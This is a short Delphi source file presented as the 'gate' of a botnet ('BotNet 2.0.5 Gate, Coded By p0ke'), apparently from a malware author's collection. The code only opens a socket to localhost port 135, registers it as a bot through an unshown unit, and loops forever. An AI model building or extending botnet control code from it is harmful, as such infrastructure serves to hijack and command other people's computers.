   (*************************)
   (**  BotNet 2.0.5 Gate  **)
   (**   - Version 1.0 -   **)
   (**    Coded By p0ke    **)
   (*************************)

   program BotGate;

   uses
     Windows,
     Winsock,
     untConnect in 'untConnect.pas';

   var
     Con : TConnect;
     Sock: TSocket;
     Addr: TSockAddrIn;
     Wsa : TWSAData;

   begin
     Con := TConnect.Create;
     Con.BotCount := 0;

     WSAStartUp(257, WSA);
       Sock := Socket(af_inet, 1, 0);
       Addr.sin_family := af_inet;
       Addr.sin_port := htons(135);
       Addr.sin_addr.S_addr := inet_addr(pchar('127.0.0.1'));

       if connect(sock, addr, sizeof(addr)) = error_success then
         Con.AddBot('Name', Sock);

     WSACleanUp;
     Repeat
       ;
     Until 1 = 2;
   end.
